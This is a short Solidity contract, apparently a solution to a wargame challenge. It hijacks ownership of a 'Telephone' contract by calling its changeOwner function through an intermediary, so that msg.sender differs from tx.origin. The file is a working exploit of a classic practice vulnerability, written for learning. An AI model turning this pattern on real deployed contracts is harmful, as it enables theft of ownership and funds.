// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./telephone.sol";

/**
 * This contract will call the target contract, in order to have msg.sender != tx.origin
 */
contract odometerAttack {

    address public newOwner;
    Telephone public immutable target;
    constructor(address targetAddress) {
        target=Telephone(targetAddress);
    }

// call the changeOwner function which will cause the change of owner
    function attack() external returns (address){
        newOwner=msg.sender;
        target.changeOwner(newOwner);
        return target.owner();
    }
}
